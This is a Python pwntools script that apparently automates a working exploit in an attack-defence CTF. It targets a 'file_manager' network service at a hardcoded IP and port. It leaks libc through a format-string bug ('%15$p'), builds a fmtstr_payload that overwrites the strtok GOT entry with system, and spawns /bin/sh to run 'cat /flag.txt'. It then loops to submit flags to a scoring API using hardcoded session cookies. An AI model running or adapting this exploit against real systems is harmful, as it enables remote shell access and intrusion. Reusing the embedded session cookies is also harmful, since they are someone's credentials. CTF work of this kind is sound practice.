#!/usr/bin/env python3
from pwn import *
import requests
import re
import time
from datetime import datetime
import signal

# --------------------------------------------------------------------------------
# CONFIG
# --------------------------------------------------------------------------------
BINARY = "./file_manager"
HOST = "35.240.149.115"
PORT = 1337

SUBMIT_URL = "https://ad.cscv.vn/submitflag_API"

COOKIES = {
    "x_polaris_sid": "C1TwfNoZE5PH|Tp3to8FCz9nN0|Wmfd8LULN",
    "x_polaris_cid": "C1Twfnhk6tQ94OumExKhYz2WqOw2Boyzy3UZ",
    "session": "2b7ec366-f1f2-4fdf-aac0-6b103ecd61d1.yjc0FmihMytkLedpWn8kSRES8a0",
    "x_polaris_sd": "ns7VrAP83ewp7VfBgLXtvB0F68cXBfRLXEyg48cm|4k2mau/dV4qP7aX68Dgq3C6/30Eo2LsxSI61p1Kasj7vgAkIWCkQ8mcxO4s4F6B8dNmxJYg453tLCnB4dA1W2l!"
}

TEAM = "MTA.ADC"
DAEMON = "Pwn01"

INTERVAL = 0
TIMEOUT = 15

# --------------------------------------------------------------------------------
# EXPLOIT SETUP
# --------------------------------------------------------------------------------
context.binary = exe = ELF(BINARY, checksec=False)
context.log_level = "warn"
context.timeout = 5
libc = exe.libc

class TimeoutException(Exception):
    pass

def timeout_handler(signum, frame):
    raise TimeoutException("Exploit timeout!")

def exploit():
    """Exploit và lấy flag"""
    p = None
    
    signal.signal(signal.SIGALRM, timeout_handler)
    signal.alarm(TIMEOUT)
    
    try:
        print("  [+] Connecting...", end=" ", flush=True)
        p = remote(HOST, PORT, level='error')
        print("OK")

        def cmd(s): 
            p.sendline(s)
            
        def reg(u, pw):
            cmd(b"register")
            p.sendlineafter(b"Username: ", u, timeout=2)
            p.sendlineafter(b"Password: ", pw, timeout=2)
            p.recvuntil(b"> ", timeout=2)

        def login(u, pw):
            cmd(b"login")
            p.sendlineafter(b"Username: ", u, timeout=2)
            p.sendlineafter(b"Password: ", pw, timeout=2)
            p.recvuntil(b"> ", timeout=2)

        def write_file(name, content_bytes):
            cmd(f"write {name}".encode())
            p.sendlineafter(b"Enter content as hex string", content_bytes.hex().encode(), timeout=2)
            p.recvuntil(b"> ", timeout=2)

        def cat_file(name):
            cmd(f"cat {name}".encode())
            return p.recvuntil(b"> ", timeout=2)

        # Register + Login
        print("  [+] Registering...", end=" ", flush=True)
        username = f"h{int(time.time()*1000)%100000}".encode()
        reg(username, b"123")
        login(username, b"123")
        print("OK")

        # Leak libc
        print("  [+] Leaking libc...", end=" ", flush=True)
        write_file("leak.txt", b"%15$p")
        out = cat_file("leak.txt")

        m = re.search(rb"0x[0-9a-fA-F]+", out)
        if not m:
            print("FAIL")
            return None

        leak = int(m.group(0), 16)
        LIBC_OFFSET = 0x601b3
        libc.address = leak - LIBC_OFFSET
        system = libc.symbols["system"]
        print(f"OK (libc: {hex(libc.address)})")

        # Overwrite GOT
        print("  [+] Overwriting GOT...", end=" ", flush=True)
        got_strtok = exe.got["strtok"]
        payload = fmtstr_payload(
            offset=6,
            writes={got_strtok: system},
            write_size="short"
        )

        write_file("pwn.txt", payload)
        cmd(b"cat pwn.txt")
        p.recvuntil(b"> ", timeout=2)
        print("OK")

        # Get shell
        print("  [+] Getting shell...", end=" ", flush=True)
        cmd(b"/bin/sh")
        time.sleep(0.5)
        print("OK")
        
        print("  [+] Reading flag...", end=" ", flush=True)
        p.sendline(b"cat /flag.txt")
        
        try:
            response = p.recv(1024, timeout=3)
            
            # Tìm flag
            lines = response.decode(errors='ignore').split('\n')
            flag = None
            
            for line in lines:
                line = line.strip()
                if line and (line.startswith('CSCV') or '{' in line):
                    flag = line
                    break
            
            if flag:
                print(f"OK")
                signal.alarm(0)
                p.close()
                return flag
            else:
                print(f"FAIL (no flag in response)")
                signal.alarm(0)
                p.close()
                return None
                
        except Exception as e:
            print(f"FAIL ({e})")
            signal.alarm(0)
            if p:
                p.close()
            return None

    except TimeoutException:
        print("\n  [-] TIMEOUT!")
        signal.alarm(0)
        if p:
            p.close()
        return None
        
    except Exception as e:
        print(f"\n  [-] ERROR: {type(e).__name__}: {e}")
        signal.alarm(0)
        if p:
            p.close()
        return None

def submit_flag(flag):
    """Submit flag và trả về full response"""
    try:
        data = {
            "team": TEAM,
            "daemon": DAEMON,
            "action": "submit-flag",
            "flag": flag
        }

        headers = {
            "Origin": "https://ad.cscv.vn",
            "Referer": "https://ad.cscv.vn/final",
            "User-Agent": "python-requests/2.x",
        }

        r = requests.post(
            SUBMIT_URL,
            data=data,
            cookies=COOKIES,
            headers=headers,
            allow_redirects=False,
            timeout=5
        )

        # Extract alert từ response
        alert_match = re.search(r'alert\(["\']([^"\']+)["\']\)', r.text)
        alert_msg = alert_match.group(0) if alert_match else None

        return {
            'success': r.status_code in [200, 302],
            'status': r.status_code,
            'location': r.headers.get('Location', 'N/A'),
            'alert': alert_msg,
            'body': r.text
        }

    except Exception as e:
        return {
            'success': False,
            'status': 0,
            'error': str(e)
        }

def main():
    print("=" * 70)
    print(f"[*] Auto Exploit - Team: {TEAM} | Daemon: {DAEMON}")
    print(f"[*] Target: {HOST}:{PORT} | Interval: {INTERVAL}s | Timeout: {TIMEOUT}s")
    print("=" * 70)
    
    count = 0
    success = 0
    
    try:
        while True:
            count += 1
            ts = datetime.now().strftime("%H:%M:%S")
            
            print(f"\n[{ts}] ═══ Run #{count} ═══")
            
            # Exploit
            flag = exploit()
            
            if flag:
                print(f"  [✓] FLAG: {flag}")
                
                # Submit
                print("  [+] Submitting...", end=" ", flush=True)
                result = submit_flag(flag)
                
                if result['success']:
                    success += 1
                    print(f"OK")
                    print(f"      ├─ Status: {result['status']}")
                    print(f"      ├─ Location: {result['location']}")
                    
                    # CHỈ IN ALERT
                    if result.get('alert'):
                        print(f"      ├─ {result['alert']}")
                    
                    print(f"      └─ Total Success: {success}/{count}")
                else:
                    print(f"FAIL")
                    if 'error' in result:
                        print(f"      └─ Error: {result['error']}")
                    else:
                        print(f"      ├─ Status: {result['status']}")
                        
                        # CHỈ IN ALERT
                        if result.get('alert'):
                            print(f"      ├─ {result['alert']}")
                        
                        print(f"      └─ Body preview: {result['body'][:100]}")
            else:
                print(f"  [✗] Exploit failed")
            
            # Wait
            if INTERVAL > 0:
                print(f"  [⏱] Waiting {INTERVAL}s...", end="", flush=True)
                time.sleep(INTERVAL)
                print(" Done")
            
    except KeyboardInterrupt:
        print("\n" + "=" * 70)
        print(f"[!] Stopped | Total Runs: {count} | Successful Submits: {success}")
        print(f"[!] Success Rate: {success/count*100:.1f}%" if count > 0 else "")
        print("=" * 70)

if __name__ == "__main__":
    main()